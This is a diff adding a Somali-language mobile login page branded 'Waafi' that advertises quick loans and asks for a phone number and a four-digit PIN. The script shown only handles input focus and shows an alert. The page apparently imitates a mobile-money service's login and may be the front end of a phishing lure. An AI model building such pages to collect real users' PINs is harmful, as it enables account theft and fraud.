@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gal</title>
+
+<style>
+
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#7ac943;
+}
+
+/* TOP GREEN AREA */
+.header{
+  text-align:center;
+  color:white;
+  padding:25px 10px;
+  font-size:20px;
+  font-weight:bold;
+}
+
+/* WHITE CARD */
+.card{
+  background:#f5f5f5;
+  border-radius:35px 35px 0 0;
+  padding:25px;
+  min-height:80vh;
+  text-align:center;
+}
+
+h2{
+  color:#555;
+}
+
+/* NUMBER BOX */
+.numberBox{
+  border:3px solid #7ac943;
+  border-radius:12px;
+  padding:15px;
+  font-size:20px;
+  margin:20px 0;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  justify-content:center;
+  background:white;
+}
+
+/* PIN BOXES */
+.pinContainer{
+  display:flex;
+  justify-content:center;
+  gap:15px;
+  margin:20px 0;
+}
+
+.pin{
+  width:55px;
+  height:55px;
+  border:3px solid #7ac943;
+  border-radius:10px;
+  font-size:28px;
+  text-align:center;
+}
+
+/* BUTTON */
+.btn{
+  margin-top:25px;
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:12px;
+  font-size:18px;
+  background:#ddd;
+  color:white;
+}
+
+.btn.active{
+  background:#7ac943;
+}
+
+/* FOOTER */
+.footer{
+  margin-top:40px;
+  color:white;
+  text-align:center;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+Waafi<br>
+Amaahado Sahlan oo Degdeg ah
+</div>
+
+<div class="card">
+
+<h2>Gal</h2>
+
+<div class="numberBox">
+🇸🇴 <span id="phoneNumber">+252</span>
+</div>
+
+<p>Geli PIN-kaaga</p>
+
+<div class="pinContainer">
+<input class="pin" maxlength="1" type="password">
+<input class="pin" maxlength="1" type="password">
+<input class="pin" maxlength="1" type="password">
+<input class="pin" maxlength="1" type="password">
+</div>
+
+<p style="color:#777;">PIN-ka ma iloobtay?</p>
+
+<button id="loginBtn" class="btn">GAL</button>
+
+</div>
+
+<div class="footer">
+<h2>Waafi</h2>
+<p>Amaahado Sahlan oo Degdeg ah</p>
+</div>
+
+<script>
+
+/* LOAD PHONE NUMBER FROM PREVIOUS PAGE */
+const savedNumber = localStorage.getItem("phoneNumber");
+
+if(savedNumber){
+  document.getElementById("phoneNumber").innerText =
+    "+252 " + savedNumber;
+}
+
+/* PIN INPUT AUTO MOVE */
+const pins = document.querySelectorAll(".pin");
+const button = document.getElementById("loginBtn");
+
+pins.forEach((input, index)=>{
+
+  input.addEventListener("input", ()=>{
+
+    if(input.value.length === 1 && index < pins.length-1){
+        pins[index+1].focus();
+    }
+
+    checkPin();
+  });
+
+  input.addEventListener("keydown",(e)=>{
+    if(e.key === "Backspace" && input.value === "" && index>0){
+        pins[index-1].focus();
+    }
+  });
+
+});
+
+/* ENABLE BUTTON WHEN 4 DIGITS ENTERED */
+function checkPin(){
+  let full = true;
+
+  pins.forEach(p=>{
+    if(p.value === "") full=false;
+  });
+
+  if(full){
+    button.classList.add("active");
+  }else{
+    button.classList.remove("active");
+  }
+}
+
+/* BUTTON ACTION */
+button.onclick=function(){
+  if(button.classList.contains("active")){
+      alert("Login Processing...");
+  }
+}
+
+</script>
+
+</body>
+</html>
